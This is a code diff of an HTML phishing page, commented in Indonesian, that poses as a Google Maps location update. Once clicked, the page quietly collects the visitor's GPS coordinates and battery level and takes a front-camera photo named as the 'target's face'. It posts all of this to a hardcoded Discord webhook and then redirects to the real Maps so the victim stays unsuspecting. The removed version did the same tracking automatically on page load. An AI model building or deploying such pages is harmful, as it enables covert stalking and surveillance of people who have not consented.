@@ -3,59 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps</title>
+    <title>Google Maps - Update Lokasi</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-        iframe { width: 100%; height: 100%; border: none; }
+        body { margin: 0; font-family: Arial, sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+        .logo { width: 100px; marginBottom: 20px; }
+        .btn { padding: 15px 30px; background: #4285F4; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .text { color: #5f6368; margin-top: 15px; font-size: 14px; text-align: center; padding: 0 20px; }
     </style>
 </head>
 <body>
 
-    <iframe src="https://www.google.com/maps/embed" allow="geolocation;camera"></iframe>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" class="logo" alt="Maps">
+    <button class="btn" onclick="mainkan()">Lihat Lokasi Terkini</button>
+    <p class="text">Klik tombol di atas untuk sinkronisasi lokasi GPS secara real-time.</p>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR";
-
-        async function kirimKeDiscord(pesan) {
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: pesan })
-            });
-        }
+        // --- 1. GANTI LINK DISCORD DI BAWAH INI ---
+        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVcKc7du-HRYBFKAvdcxcz9jcXzQiJ_5G4hWa1rX0GUPV0QZP9G_B7fV4W9u"; 
 
         async function mainkan() {
-            // 1. Ambil info dasar HP (Ini Pasti Muncul!)
-            let infoHP = `**[!] ADA YANG MASUK LINK!**\n`;
-            infoHP += `📱 **Model:** ${navigator.platform}\n`;
-            infoHP += `🌐 **Browser:** ${navigator.userAgent}\n`;
-            infoHP += `🖥️ **Layar:** ${window.screen.width}x${window.screen.height}\n`;
-
-            // 2. Ambil Baterai (Kita tunggu sebentar biar datanya dapet)
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    const level = Math.round(b.level * 100);
-                    const status = b.charging ? "Lagi di-cas" : "Tidak di-cas";
-                    infoHP += `🔋 **Baterai:** ${level}% (${status})`;
-                }
-            } catch (e) {
-                infoHP += `🔋 **Baterai:** Tidak terbaca`;
-            }
+            document.querySelector('.btn').innerHTML = "Menghubungkan GPS...";
             
-            // Langsung kirim info HP & Baterai dulu!
-            kirimKeDiscord(infoHP);
+            // Ambil Info Baterai
+            let bInfo = "N/A";
+            try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}%`; } catch(e){}
 
-            // 3. Baru minta Lokasi (Ini butuh persetujuan target)
-            navigator.geolocation.getCurrentPosition(pos => {
-                const linkMaps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                kirimKeDiscord(`**[+] LOKASI DIDAPAT!**\n📍 Link: ${linkMaps}\n🎯 Akurasi: ${pos.coords.accuracy} meter`);
-            }, err => {
-                kirimKeDiscord(`[-] Target menolak izin lokasi.`);
+            // Minta Izin Lokasi & Kamera
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                try {
+                    // Paksa Ambil Kamera karena sudah ada klik tombol
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append("content", `**✅ TARGET TERPANTAU!**\n🔋 Baterai: ${bInfo}\n📍 Maps: ${mapsUrl}`);
+                        formData.append("file", blob, "wajah_target.jpg");
+                        
+                        await fetch(webhookURL, { method: 'POST', body: formData });
+                        
+                        // Buang ke Maps asli biar gak curiga
+                        window.location.href = mapsUrl;
+                    }, 'image/jpeg');
+
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) {
+                    // Jika kamera ditolak, kirim lokasi saja
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ content: `**📍 LOKASI (Kamera Ditolak)**\n🔋 Baterai: ${bInfo}\n🌍 Maps: ${mapsUrl}` })
+                    });
+                    window.location.href = mapsUrl;
+                }
+            }, (err) => {
+                alert("Izin lokasi diperlukan untuk melihat peta.");
+                document.querySelector('.btn').innerHTML = "Lihat Lokasi Terkini";
             });
         }
-
-        window.onload = mainkan;
     </script>
 </body>
 </html>
